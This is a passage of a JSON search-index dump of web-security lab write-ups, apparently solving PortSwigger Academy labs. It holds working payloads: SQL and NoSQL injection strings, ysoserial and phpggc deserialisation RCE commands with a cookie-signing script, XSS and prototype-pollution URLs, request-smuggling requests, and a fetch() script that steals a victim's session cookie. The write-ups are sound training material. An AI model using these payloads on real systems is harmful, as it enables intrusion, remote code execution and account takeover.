    "c": "SQL injection  SQL injection vulnerabilities occur due to a lack of input validation. To identify a SQL injection bug, enter special characters to generate an error or unexpected behaviour. There are three main types of SQL injection: in-band, inferential or blind, and out-band. You can use the Intruder and Comparer tools in Burp, to automate SQL injection identification. Testing for SQL injection manually isn’t scalable. Using tools like SQLMap and NoSQLMap, it is possible to automate SQL injection exploitation. Steps  Map any of the application’s endpoints that take in user input. Insert test payloads into these locations to discover whether they’re vulnerable to SQL injections. If the endpoint isn’t vulnerable to classic SQL injections, try inferential techniques instead. Once you’ve confirmed that the endpoint is vulnerable to SQL injections, use different SQL injection queries to leak information from the database. Escalate the issue. Figure out what data you can leak from the endpoint and whether you can achieve an authentication bypass. Be careful not to execute any actions that would damage the integrity of the target’s database, such as deleting user data or modifying the structure of the database. Draft up a report with an example payload that the security team can use to duplicate your results. Because SQL injections are quite technical to exploit most of the time, it’s a good idea to spend some time crafting an easy-to-understand proof of concept. Look for classic SQL injections  Classic SQL injections are the easiest to find and exploit. In classic SQL injections, the results of the SQL query are returned directly to the attacker in an HTTP response. There are two subtypes: UNION based and error based. Look for blind SQL injections  Also called inferential SQL injections, blind SQL injections are a little harder to detect and exploit. They happen when attackers cannot directly extract information from the database because the application does not return SQL data or descriptive error messages. In this case, attackers can infer information by sending SQL injection payloads to the server and observing its subsequent behaviour. Blind SQL injections have two subtypes as well: Boolean based and time based. Exfiltrate information by using SQL injections  Imagine that the web application you’re attacking does not use your input in a SQL query right away. Instead, it uses the input unsafely in a SQL query during a backend operation, so you have no way to retrieve the results of injection via an HTTP response, or infer the query’s results by observing server behaviour. Sometimes there’s even a time delay between when you submitted the payload and when the payload gets used in an unsafe query, so you won’t immediately be able to observe differences in the application’s behaviour. In this case, you will need to make the database store information somewhere when it does run the unsafe SQL query. In MySQL, the SELECT. . .INTO statement tells the database to store the results of a query in an output file on the local machine. SELECT Password FROM Users WHERE Username='admin' INTO OUTFILE '/var/www/html/output.txt' Then access the information by navigating to the /output.txt page on the target: https:// example.com/output.txt . This technique is also a good way to detect second-order SQL injections, since in second-order SQL injections, there is often a time delay between the malicious input and the SQL query being executed. Look for NoSQL injections  Databases do not always use SQL. NoSQL, or Not Only SQL, databases are those that do not use the SQL language. Unlike SQL databases, which store data in tables, NoSQL databases store data in other structures, such as key-value pairs and graphs. NoSQL query syntax is database-specific, and queries are often written in the programming language of the application. Modern NoSQL databases, such as MongoDB, Apache CouchDB, and Apache Cassandra, are also vulnerable to injection attacks. These vulnerabilities are becoming more common as NoSQL rises in popularity. In MongoDB syntax, Users.find() returns users that meet a certain criteria: Users.find({username: 'vickie', password: 'password123'}); If the application uses this functionality to log in users and populates the database query directly with user input, like this: Users.find({username: $username, password: $password}); attackers can submit the password {$ne: \"\"} to log in as anyone. If the attacker submits: Users.find({username: 'admin', password: {$ne: \"\"}}); In MongoDB, $ne selects objects whose value is not equal to the specified value, and the query would return users whose username is admin and password is not equal to an empty string. Injecting into MongoDB queries can also allow attackers to execute arbitrary JavaScript code on the server. In MongoDB, the $where , mapReduce , $accumulator , and $function operations allow developers to run arbitrary JavaScript. The process of looking for NoSQL injections is similar to detecting SQL injections. You can insert special characters such as quotes ( ' \" ), semi-colons ( ; ), and backslashes ( \\ ), as well as parentheses ( () ), brackets( [] ), and braces ( {} ) into user-input fields and look for errors or other anomalies. You can also automate the hunting process by using the tool NoSQLMap . Escalation  The vulnerability is one of the oldest, most widespread and most critical of web application vulnerabilities. It may be used to neglect a web application’s certification and authorisation mechanisms and recover the contents of an entire database. SQL injection can also be used to add, alter and remove accounts in a database, affecting data integrity: It may be possible to execute any malicious SQL inquiry or command through the web application and recover all the data saved in the database, including customer/client information, personally identifiable information (PII) such as names associated with social security numbers and credit card details, and credentials to access administrator accounts and private areas of the gateway, such as an administrator portal. By using an SQL injection, it is also possible to remove tables from the database. Depending on the server setup and software being used, by using an SQL injection vulnerability, it may be possible to write to a file or accomplish operating system commands . With such increased privileges this might result in a total server compromise. It is very hard to determine the impact of an exploited SQL injection. Attackers most often use SQL injections to extract information from the database. Successfully collecting data from a SQL injection is a technical task that can sometimes be complicated. If the hackers are skilled, it is hard to identify the attack until the data is available to the public and another reputation is going down the drain. Portswigger lab writeups  SQL injection vulnerability in WHERE clause allowing retrieval of hidden data SQL injection vulnerability allowing login bypass SQL injection UNION attack, determining the number of columns returned by the query SQL injection UNION attack, finding a column containing text SQL injection UNION attack, retrieving data from other tables SQL injection UNION attack, retrieving multiple values in a single column SQL injection attack, querying the database type and version on Oracle SQL injection attack, querying the database type and version on MySQL and Microsoft SQL injection attack, listing the database contents on non-Oracle databases SQL injection attack, listing the database contents on Oracle Blind SQL injection with conditional responses Blind SQL injection with conditional errors Blind SQL injection with time delays Blind SQL injection with time delays and information retrieval Blind SQL injection with out-of-band interaction Blind SQL injection with out-of-band data exfiltration SQL injection with filter bypass via XML encoding Remediation  There are several effective ways to...",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "98f11f32d0139add40c1f5c09cc81ba2",
    "u": "https://webapp.tymyrddin.dev/docs/smuggling/9",
    "t": "Exploiting HTTP request smuggling to capture other users’ requests ",
    "c": "Exploiting HTTP request smuggling to capture other users’ requests  Description  This lab involves a front-end and back-end server, and the front-end server doesn’t support chunked encoding. Reproduction and proof of concept  Visit a blog post and post a comment. Send the comment-post request to Burp Repeater, shuffle the body parameters so the comment parameter occurs last, and make sure it still works. Increase the comment-post request’s Content-Length to 400, then smuggle it to the back-end server: POST / HTTP/1.1 Host: lab-id.web-security-academy.net Content-Type: application/x-www-form-urlencoded Content-Length: 256 Transfer-Encoding: chunked 0 POST /post/comment HTTP/1.1 Content-Type: application/x-www-form-urlencoded Content-Length: 400 Cookie: session=your-session-token csrf=your-csrf-token&postId=5&name=Carlos+Montoya&email=carlos%40normal-user.net&website=&comment=test View the blog post to see if there’s a comment containing a user’s request. Note that the target user only browses the website intermittently so you may need to repeat this attack a few times before it’s successful. A few times, like around 5: Then headers as a comment, but not enough yet. So, repeating with 700 , then 800 (nearly there), and finally, with a content-length of 810 : Intercept, carlos ’s login, change the user’s Cookie header from the comment, and the csrf token from the one used in the comments requests, and use it to access his account. Exploitability  An attacker will need to smuggle a request to the back-end server that causes the next user’s request to be stored in the application. Then retrieve the next user’s request and use the victim user’s cookies to access their account.",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "b907027319de5d1bd6e1e2b2e2ae292f",
    "u": "https://webapp.tymyrddin.dev/docs/deserialisation/5",
    "t": "Exploiting Java deserialisation with Apache Commons ",
    "c": "Exploiting Java deserialisation with Apache Commons  Description  This lab uses a serialisation-based session mechanism and loads the Apache Commons Collections library. Reproduction  Log in with wiener:peter . The session cookie is URL and base64 encoded and contains a serialised Java object (the first two bytes are aced ). Send a request containing the session cookie to Burp Repeater. Download the Ysoserial tool, if need be, make the on kali necessary changes to run it . Execute the command to generate a Base64-encoded serialised object containing an RCE payload. The application uses Apache Commons Collections library, so use a CommonsCollections payload: $ java -jar ysoserial-all.jar CommonsCollections4 'rm /home/carlos/morale.txt' | base64 Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true rO0ABXNyABdqYXZhLnV0aWwuUHJpb3JpdHlRdWV1ZZTaMLT7P4KxAwACSQAEc2l6ZUwACmNvbXBh cmF0b3J0ABZMamF2YS91dGlsL0NvbXBhcmF0b3I7eHAAAAACc3IAQm9yZy5hcGFjaGUuY29tbW9u cy5jb2xsZWN0aW9uczQuY29tcGFyYXRvcnMuVHJhbnNmb3JtaW5nQ29tcGFyYXRvci/5hPArsQjM AgACTAAJZGVjb3JhdGVkcQB+AAFMAAt0cmFuc2Zvcm1lcnQALUxvcmcvYXBhY2hlL2NvbW1vbnMv ... In Burp Repeater, replace the session cookie with the malicious one just created. Select the entire cookie and then URL-encode it. Send the request to solve the lab. PoC  Exploitability  Although attackers do not have source code access, they can still exploit this lab using pre-built gadget chains. An attacker will need to log in; use a third-party tool to generate a malicious serialised object containing a remote code execution payload; and pass this object into the website to delete the morale.txt file from Carlos’s home directory.",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "51b88b78b931c648bb91df48e0ee4f05",
    "u": "https://webapp.tymyrddin.dev/docs/acl/readme",
    "t": "Introduction ",
    "c": "Portswigger Academy Access control vulnerabilities Labs Introduction  What?  Access control (or authorisation) is the application of constraints on whom (or what) can perform attempted actions or access resources that they have requested. In the context of web applications, access control is dependent on authentication and session management: Authentication identifies the user and confirms that they are who they say they are. Session management identifies which subsequent HTTP requests are being made by that same user. Access control determines whether the user is allowed to carry out the action that they are attempting to perform. Why?  Broken access controls are a commonly encountered and often critical security vulnerability. Design and management of access controls is a complex and dynamic problem that applies business, organisational, and legal constraints to a technical implementation. Access control design decisions have to be made by humans, not technology, and the potential for errors is high. How?  Broken access control Insecure direct object references (IDOR) Unprotected admin functionality Unprotected admin functionality with unpredictable URL User role controlled by request parameter User role can be modified in user profile User ID controlled by request parameter User ID controlled by request parameter, with unpredictable user IDs User ID controlled by request parameter with data leakage in redirect User ID controlled by request parameter with password disclosure Insecure direct object references URL-based access control can be circumvented Method-based access control can be circumvented Multistep process with no access control on one step Referer-based access control",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "1ff252ec108899e6e9d8e63dcaea3fe0",
    "u": "https://webapp.tymyrddin.dev/docs/pollution/1",
    "t": "DOM XSS via client-side prototype pollution ",
    "c": "DOM XSS via client-side prototype pollution  Description  This lab is vulnerable to DOM XSS via client-side prototype pollution. Reproduction and proof of concept  Find a prototype pollution source  In browser, try polluting the Object.prototype by injecting an arbitrary property via the query string: /?__proto__[foo]=bar Open the browser DevTools panel and go to the Console tab. Enter Object.prototype . Study the properties of the returned object. Observe that it now has a foo property with the value bar. You’ve successfully found a prototype pollution source. Identify a gadget  In the browser DevTools panel, go to the Sources tab. Study the JavaScript files that are loaded by the target site and look for any DOM XSS sinks. In searchLogger.js , notice that if the config object has a transport_url property, this is used to dynamically append a script to the DOM. Notice that no transport_url property is defined for the config object. This is a potential gadget for controlling the src of the script element. Craft an exploit  Using the prototype pollution source you identified earlier, try injecting an arbitrary transport_url property: /?__proto__[transport_url]=foo In the browser DevTools panel, go to the Elements tab and study the HTML content of the page. Observe that a script element has been rendered on the page, with the src attribute foo . Modify the payload in the URL to inject an XSS proof-of-concept. For example, you can use a data: URL : /?__proto__[transport_url]=data:,alert(1); Observe that the alert(1) is called and the lab is solved. Exploitability  An attacker will need to find a source that can be used to add arbitrary properties to the global Object.prototype ; identify a gadget property that allows for executing arbitrary JavaScript; combine these to call alert() . This lab can be solved manually in a browser, or by using DOM Invader .",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "b1178522edf761e77044c2ed2fe098f7",
    "u": "https://webapp.tymyrddin.dev/docs/techniques/acl",
    "t": "Broken access control ",
    "c": "Broken access control  Broken Access Control occurs when a user able to access or modify information they should not have access to. This could be related to being unauthenticated, or accessing content that the user’s role should not have access to. IDOR (Insecure Direct Object Reference) is considered a broken access control vulnerability in which a user is able to access/modify information they should not be allowed to, typically via changing an integer value. Like application (business) logic errors , broken access control vulnerabilities are a different beast altogether. Access control determines whether a user is allowed to carry out the action that they are attempting to perform. 403 forbidden is an error that occurs when navigating to a page that requires permissions a user or role does not have. Such errors may be bypassed by converting a GET request to a POST request, modifying case in the URL path, appending URL encoded punctuation, etc. Steps  Learn about the target application. The more you understand about the architecture and development process of a web application, the better you will be at spotting these vulnerabilities. Note endpoints which should require authentication and then browse them unauthenticated. This can be automated with Burp Intruder. Manually intercept requests while browsing the site and pay attention to sensitive functionalities. Keep track of every request sent during these actions. For example check if you can access: /admin/upload as an authenticated user (non admin) /api/users unauthenticated /api/user/someone as another user Use your creativity to think of ways to bypass access control. Think of ways to combine a vulnerability found with other vulnerabilities to maximize the potential impact of the flaw. Draft the report. Bypassing protections  Appending %2e (URL encoded . ) or other encoded punctuation: http://example.com/./admin/ http://example.com/admin/. http://example.com//admin// http://example.com/./admin/.. http://example.com/;/admin http://example.com/.;/admin http://example.com//;//admin Automation  Bypass-403 is a simple script just made for self use for bypassing 403 and can also be used to compare responses on various conditions. Escalation  Bypassing 403 forbidden pages can give access to admin or elevated privileges, and if reported can result in some great bounties. Escalating broken access control depends entirely on the nature of the flaw found. But a general rule of thumb is to try to combine the broken access control with other vulnerabilities to increase their impact. A broken access control that gives access to the admin panel with a console or application deployment capabilities can lead to remote code execution . If you can find the configuration files of a web application, you can search for CVEs for the software versions in use to further compromise the application. You might also find credentials in a file that can be used to access different machines on the network. Think of ways malicious users can exploit these vulnerabilities to the fullest extent, and communicate their impact in detail in the report. Portswigger lab writeups  Unprotected admin functionality Unprotected admin functionality with unpredictable URL User role controlled by request parameter User role can be modified in user profile User ID controlled by request parameter User ID controlled by request parameter, with unpredictable user IDs User ID controlled by request parameter with data leakage in redirect User ID controlled by request parameter with password disclosure Insecure direct object references URL-based access control can be circumvented Method-based access control can be circumvented Multistep process with no access control on one step Referer-based access control Remediation  Most frameworks do not yet have the capability of automatically implementing permissions structures. Permissions structures need to be implemented by developers, because every application has specific, custom requirements. In most cases, the reason that access control is broken is that it has not been implemented. When designing a permissions structure for an application, implement a deny by default (for all requests to all endpoints), and require allowlisting specific users/roles for any interaction to occur with that endpoint. Resources  Portswigger: Access control vulnerabilities and privilege escalation OWASP: Broken Access Control OWASP Authorization Cheat Sheet Role and Attribute based Access Control for Node.js Bug Bounty Bootcamp Bug Bounty Hunting Essentials Bug Bounty Hunting for Web Security",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "898766270572420a38c30733b3bf2bfd",
    "u": "https://webapp.tymyrddin.dev/docs/business/9",
    "t": "Authentication bypass via flawed state machine ",
    "c": "Authentication bypass via flawed state machine  Description  This lab makes flawed assumptions about the sequence of events in the login process. Reproduction  With Burp running, complete the login process with wiener:peter and notice that you need to select your role before you are taken to the home page. Use the content discovery tool to identify the /admin path. Try browsing to /admin directly from the role selection page and observe that this doesn’t work. Log out and then go back to the login page. In Burp, turn on proxy intercept then log in. Forward the POST /login request. The next request is GET /role-selector . Drop this request and then browse to the lab’s home page. Observe that your role has defaulted to the administrator role, and you have access to the Admin panel . Delete Carlos to solve the lab. PoC  Exploitability  An attacker will need to log in; exploit the flaw to bypass the lab’s authentication, access the admin interface, and delete Carlos.",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "0eaeae20445daf6095839b5792588db2",
    "u": "https://webapp.tymyrddin.dev/docs/xss/18",
    "t": "Reflected XSS into HTML context with all tags blocked except custom ones ",
    "c": "Reflected XSS into HTML context with all tags blocked except custom ones  Description  The website in this lab blocks all HTML tags except custom ones. Reproduction and proof of concept  Go to the exploit server and paste the following code, replacing lab-id with your lab ID: <script> location = 'https://lab-id.web-security-academy.net/?search=%3Cxss+id%3Dx+onfocus%3Dalert%28document.cookie%29%20tabindex=1%3E#x'; </script> Click Store and Deliver exploit to victim . This injection creates a custom tag with the ID x , which contains an onfocus event handler that triggers the alert function. The hash at the end of the URL focuses on this element as soon as the page is loaded, causing the alert payload to be called.",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "c6ec4ecd0e5ac4ba67f1418f020f0153",
    "u": "https://webapp.tymyrddin.dev/docs/acl/8",
    "t": "User ID controlled by request parameter with password disclosure ",
    "c": "User ID controlled by request parameter with password disclosure  Description  This lab has user account page that contains the current user’s existing password, prefilled in a masked input. Reproduction and proof of concept  Log in with wiener:peter , and access the user account page. Change the “id” parameter in the URL to administrator . View the response in Burp and observe that it contains the administrator’s password. Log in to the administrator account and delete carlos . Exploitability  An attacker will need to retrieve the administrator’s password, then use it to delete carlos .",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "bc23948b8ec946d76a3690d112759e14",
    "u": "https://webapp.tymyrddin.dev/docs/deserialisation/6",
    "t": "Exploiting PHP deserialisation with a pre-built gadget chain ",
    "c": "Exploiting PHP deserialisation with a pre-built gadget chain  Description  This lab has a serialisation-based session mechanism that uses a signed cookie. It also uses a common PHP framework. Reproduction and proof of concept  Log in with wiener:peter and send a request containing the session cookie to Burp Repeater. Highlight the cookie and look at the Inspector panel. Notice that the cookie contains a Base64-encoded token, signed with a SHA-1 HMAC hash. {\"token\":\"Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czoxMjoiYWNjZXNzX3Rva2VuIjtzOjMyOiJ3N2RxdDRnaHdmcmx3aGVvNnNmMHRuNWR0dXY1Z214ZyI7fQ==\",\"sig_hmac_sha1\":\"cb67bb077cb2d185e102452dbb53a595ea99f89a\"} Copy the decoded cookie from the Inspector and paste it into Decoder. In Decoder, highlight the token and then select Decode as -> Base64 . {\"token\":\"O:4:\"User\":2:{s:8:\"username\";s:6:\"wiener\";s:12:\"access_token\";s:32:\"w7dqt4ghwfrlwheo6sf0tn5dtuv5gmxg\";}\",\"sig_hmac_sha1\":\"cb67bb077cb2d185e102452dbb53a595ea99f89a\"} The token is actually a serialised PHP object. In Burp Repeater, observe that if you try sending a request with a modified cookie, an exception is raised because the digital signature no longer matches. And also notice that: A developer comment discloses the location of a debug file at /cgi-bin/phpinfo.php . The error message reveals that the website is using the Symfony 4.3.6 framework. Request the /cgi-bin/phpinfo.php file in Burp Repeater and observe that it leaks some key information about the website, including the SECRET_KEY environment variable. Save this key; you’ll need it to sign your exploit later. SECRET_KEY liwo648yhcpwlrhjriffb0bsvl1pz7uq Download the phpgcc tool (or install via package manager on kali) and execute the command to generate a Base64-encoded serialised object that exploits an RCE gadget chain in Symfony to delete Carlos’s morale.txt file: $ phpggc Symfony/RCE4 exec 'rm /home/carlos/morale.txt' | base64 Tzo0NzoiU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQWRhcHRlclxUYWdBd2FyZUFkYXB0ZXIiOjI6 e3M6NTc6IgBTeW1mb255XENvbXBvbmVudFxDYWNoZVxBZGFwdGVyXFRhZ0F3YXJlQWRhcHRlcgBk ZWZlcnJlZCI7YToxOntpOjA7TzozMzoiU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQ2FjaGVJdGVt IjoyOntzOjExOiIAKgBwb29sSGFzaCI7aToxO3M6MTI6IgAqAGlubmVySXRlbSI7czoyNjoicm0g L2hvbWUvY2FybG9zL21vcmFsZS50eHQiO319czo1MzoiAFN5bWZvbnlcQ29tcG9uZW50XENhY2hl XEFkYXB0ZXJcVGFnQXdhcmVBZGFwdGVyAHBvb2wiO086NDQ6IlN5bWZvbnlcQ29tcG9uZW50XENh Y2hlXEFkYXB0ZXJcUHJveHlBZGFwdGVyIjoyOntzOjU0OiIAU3ltZm9ueVxDb21wb25lbnRcQ2Fj aGVcQWRhcHRlclxQcm94eUFkYXB0ZXIAcG9vbEhhc2giO2k6MTtzOjU4OiIAU3ltZm9ueVxDb21w b25lbnRcQ2FjaGVcQWRhcHRlclxQcm94eUFkYXB0ZXIAc2V0SW5uZXJJdGVtIjtzOjQ6ImV4ZWMi O319Cg== Construct a valid cookie containing this malicious object and sign it correctly using the secret key obtained earlier. You can use the following PHP script to do this. Before running the script, you just need to make the following changes: Assign the object you generated in phpgcc to the $object variable. Assign the secret key that you copied from the phpinfo.php file to the $secretKey variable. <?php $object = \"Tzo0NzoiU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQWRhcHRlclxUYWdBd2FyZUFkYXB0ZXIiOjI6e3M6NTc6IgBTeW1mb255XENvbXBvbmVudFxDYWNoZVxBZGFwdGVyXFRhZ0F3YXJlQWRhcHRlcgBkZWZlcnJlZCI7YToxOntpOjA7TzozMzoiU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQ2FjaGVJdGVtIjoyOntzOjExOiIAKgBwb29sSGFzaCI7aToxO3M6MTI6IgAqAGlubmVySXRlbSI7czoyNjoicm0gL2hvbWUvY2FybG9zL21vcmFsZS50eHQiO319czo1MzoiAFN5bWZvbnlcQ29tcG9uZW50XENhY2hlXEFkYXB0ZXJcVGFnQXdhcmVBZGFwdGVyAHBvb2wiO086NDQ6IlN5bWZvbnlcQ29tcG9uZW50XENhY2hlXEFkYXB0ZXJcUHJveHlBZGFwdGVyIjoyOntzOjU0OiIAU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQWRhcHRlclxQcm94eUFkYXB0ZXIAcG9vbEhhc2giO2k6MTtzOjU4OiIAU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQWRhcHRlclxQcm94eUFkYXB0ZXIAc2V0SW5uZXJJdGVtIjtzOjQ6ImV4ZWMiO319Cg==\"; $secretKey = \"liwo648yhcpwlrhjriffb0bsvl1pz7uq\"; $cookie = urlencode('{\"token\":\"' . $object . '\",\"sig_hmac_sha1\":\"' . hash_hmac('sha1', $object, $secretKey) . '\"}'); echo $cookie; Save as cookie.php and run it. This will output a valid, signed cookie to the console. $ php cookie.php %7B%22token%22%3A%22Tzo0NzoiU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQWRhcHRlclxUYWdBd2FyZUFkYXB0ZXIiOjI6e3M6NTc6IgBTeW1mb255XENvbXBvbmVudFxDYWNoZVxBZGFwdGVyXFRhZ0F3YXJlQWRhcHRlcgBkZWZlcnJlZCI7YToxOntpOjA7TzozMzoiU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQ2FjaGVJdGVtIjoyOntzOjExOiIAKgBwb29sSGFzaCI7aToxO3M6MTI6IgAqAGlubmVySXRlbSI7czoyNjoicm0gL2hvbWUvY2FybG9zL21vcmFsZS50eHQiO319czo1MzoiAFN5bWZvbnlcQ29tcG9uZW50XENhY2hlXEFkYXB0ZXJcVGFnQXdhcmVBZGFwdGVyAHBvb2wiO086NDQ6IlN5bWZvbnlcQ29tcG9uZW50XENhY2hlXEFkYXB0ZXJcUHJveHlBZGFwdGVyIjoyOntzOjU0OiIAU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQWRhcHRlclxQcm94eUFkYXB0ZXIAcG9vbEhhc2giO2k6MTtzOjU4OiIAU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQWRhcHRlclxQcm94eUFkYXB0ZXIAc2V0SW5uZXJJdGVtIjtzOjQ6ImV4ZWMiO319Cg%3D%3D%22%2C%22sig_hmac_sha1%22%3A%220f40533d1324c3522a3a74c82061b0c59565b26c%22%7D In Burp Repeater, replace the session cookie with the malicious one just created, then send the request to solve the lab. Exploitability  Although attackers do not have source code access, they can still exploit this lab using pre-built gadget chains. An attacker will need to log in; identify the target framework; use a third-party tool to generate a malicious serialised object containing a remote code execution payload; work out how to generate a valid signed cookie containing the malicious object; and pass this into the website to delete the morale.txt file from Carlos’s home directory.",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "8a0da1a7a492263a149ecbcba8f0da38",
    "u": "https://webapp.tymyrddin.dev/docs/ssti/readme",
    "t": "Introduction ",
    "c": "Portswigger Academy Server-side template injection Labs Introduction  What?  Server-side template injection is when an attacker is able to use native template syntax to inject a malicious payload into a template, which is then executed server-side. Why?  Template engines are designed to generate web pages by combining fixed templates with volatile data. Server-side template injection attacks can occur when user input is concatenated directly into a template, rather than passed in as data. This allows attackers to inject arbitrary template directives in order to manipulate the template engine, often enabling them to take complete control of the server. As the name suggests, server-side template injection payloads are delivered and evaluated server-side, potentially making them much more dangerous than a typical client-side template injection. How?  Template injection (SSTI) techniques Basic server-side template injection Basic server-side template injection (code context) Server-side template injection using documentation Server-side template injection in an unknown language with a documented exploit Server-side template injection with information disclosure via user-supplied objects Server-side template injection in a sandboxed environment Server-side template injection with a custom exploit",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "97b31c7ea2b21f2721e17aa8b83d87db",
    "u": "https://webapp.tymyrddin.dev/docs/smuggling/20",
    "t": "Client-side desync ",
    "c": "Client-side desync  Description  This lab is vulnerable to client-side desync attacks because the server ignores the Content-Length header on requests to some endpoints. This can be exploited to induce a victim’s browser to disclose its session cookie. See Browser-Powered Desync Attacks: A New Frontier in HTTP Request Smuggling: CSD . Reproduction and proof of concept  Identify a vulnerable endpoint  Notice that requests to / result in a redirect to /en . Send the GET / request to Burp Repeater. In Burp Repeater, use the tab-specific settings to disable the Update Content-Length option. Convert the request to a POST request (right-click and select Change request method). Change the Content-Length to 1 or higher, but leave the body empty. Send the request. Observe that the server responds immediately rather than waiting for the body. This suggests that it is ignoring the specified Content-Length . Confirm the desync vector in Burp  Re-enable the Update Content-Length option. Add an arbitrary request smuggling prefix to the body: POST / HTTP/1.1 Host: lab-id.web-security-academy.net Connection: close Content-Length: CORRECT GET /404 HTTP/1.1 Foo: x Add a normal request for GET / to the tab group, after your malicious request. Using the drop-down menu next to the Send button, change the send mode to Send group in sequence (single connection). Change the Connection header of the first request to keep-alive . Send the sequence and check the responses. If the response to the second request matches what you expected from the smuggled prefix (in this case, a 404 response), this confirms that you can cause a desync. Replicate the desync vector in your browser  Open a separate instance of Chrome that is not proxying traffic through Burp. Go to the exploit server. Open the browser developer tools and go to the Network tab. Ensure that the Preserve log option is selected and clear the log of any existing entries. Go to the Console tab and replicate the attack from the previous section using the fetch() API as follows: fetch('https://lab-id.web-security-academy.net', { method: 'POST', body: 'GET /hopefully404 HTTP/1.1\\r\\nFoo: x', mode: 'cors', credentials: 'include', }).catch(() => { fetch('https://lab-id.web-security-academy.net', { mode: 'no-cors', credentials: 'include' }) }) Note that we’re intentionally triggering a CORS error to prevent the browser from following the redirect, then using the catch() method to continue the attack sequence. On the Network tab, you should see two requests: The main request, which has triggered a CORS error. A request for the home page, which received a 404 response. This confirms that the desync vector can be triggered from a browser. Identify an exploitable gadget  Back in Burp’s browser, visit one of the blog posts and observe that this lab contains a comment function. From the Proxy > HTTP history , find the GET /en/post?postId=x request. Make note of the following: The postId from the query string Your session and _lab_analytics cookies The csrf token In Burp Repeater, use the desync vector from the previous section to try to capture your own arbitrary request in a comment. For example: Request 1: POST / HTTP/1.1 Host: lab-id.web-security-academy.net Connection: keep-alive Content-Length: CORRECT POST /en/post/comment HTTP/1.1 Host: lab-id.web-security-academy.net Cookie: session=YOUR-SESSION-COOKIE; _lab_analytics=YOUR-LAB-COOKIE Content-Length: NUMBER-OF-BYTES-TO-CAPTURE Content-Type: x-www-form-urlencoded Connection: keep-alive csrf=YOUR-CSRF-TOKEN&postId=YOUR-POST-ID&name=wiener&email=wiener@web-security-academy.net&website=https://ginandjuice.shop&comment= Request 2: GET /capture-me HTTP/1.1 Host: lab-id.web-security-academy.net Note that the number of bytes that you try to capture must be longer than the body of your POST /en/post/comment request prefix, but shorter than the follow-up request. Back in the browser, refresh the blog post and confirm that you have successfully output the start of your GET /capture-me request in a comment. Replicate the attack in your browser  Open a separate instance of Chrome that is not proxying traffic through Burp. Go to the exploit server. Open the browser developer tools and go to the Network tab. Ensure that the Preserve log option is selected and clear the log of any existing entries. Go to the Console tab and replicate the attack from the previous section using the fetch() API as follows: fetch('https://lab-id.web-security-academy.net', { method: 'POST', body: 'POST /en/post/comment HTTP/1.1\\r\\nHost: lab-id.web-security-academy.net\\r\\nCookie: session=YOUR-SESSION-COOKIE; _lab_analytics=YOUR-LAB-COOKIE\\r\\nContent-Length: NUMBER-OF-BYTES-TO-CAPTURE\\r\\nContent-Type: x-www-form-urlencoded\\r\\nConnection: keep-alive\\r\\n\\r\\ncsrf=YOUR-CSRF-TOKEN&postId=YOUR-POST-ID&name=wiener&email=wiener@web-security-academy.net&website=https://portswigger.net&comment=', mode: 'cors', credentials: 'include', }).catch(() => { fetch('https://lab-id.web-security-academy.net/capture-me', { mode: 'no-cors', credentials: 'include' }) }) On the Network tab, you should see three requests: The initial request, which has triggered a CORS error. A request for /capture-me , which has been redirected to the post confirmation page. A request to load the post confirmation page. Refresh the blog post and confirm that you have successfully output the start of your own /capture-me request via a browser-initiated attack. Exploit  Go to the exploit server. In the Body panel, paste the script that you tested in the previous section. Wrap the entire script in HTML script tags. Store the exploit and click Deliver to victim . Refresh the blog post and confirm that you have captured the start of the victim user’s request. Repeat this attack, adjusting the Content-Length of the nested POST /en/post/comment request until you have successfully output the victim’s session cookie. In Burp Repeater, send a request for /my-account using the victim’s stolen cookie to solve the lab. Exploitability  An attacker will need to identify a client-side desync vector in Burp, then confirm that it can be replicated this in your browser; identify a gadget that enables storing text data within the application; combine these to craft an exploit that causes the victim’s browser to issue a series of cross-domain requests that leak their session cookie; and use the stolen cookie to access the victim’s account.",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "4bfe894e4af96ad9f7257af2d17f2dad",
    "u": "https://webapp.tymyrddin.dev/docs/business/7",
    "t": "Weak isolation on dual-use endpoint ",
    "c": "Weak isolation on dual-use endpoint  Description  This lab makes a flawed assumption about the user’s privilege level based on their input. As a result, it is possible to exploit the logic of its account management features to gain access to arbitrary users’ accounts. Reproduction  With Burp running, log in with wiener:peter and access the account page. Change the password. Study the POST /my-account/change-password request in Burp Repeater. Notice that if you remove the current-password parameter entirely, you are able to successfully change the password without providing the current one. The user whose password is changed is determined by the username parameter. Set username=administrator and send the request again. Log out and notice that you can now successfully log in as the administrator using the password just set. Go to the admin panel and delete Carlos to solve the lab. PoC  Exploitability  An attacker will need to log in; access the administrator account and delete Carlos.",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "52a763297baa13ebe27623282ee3c5d9",
    "u": "https://webapp.tymyrddin.dev/docs/cache/readme",
    "t": "Introduction ",
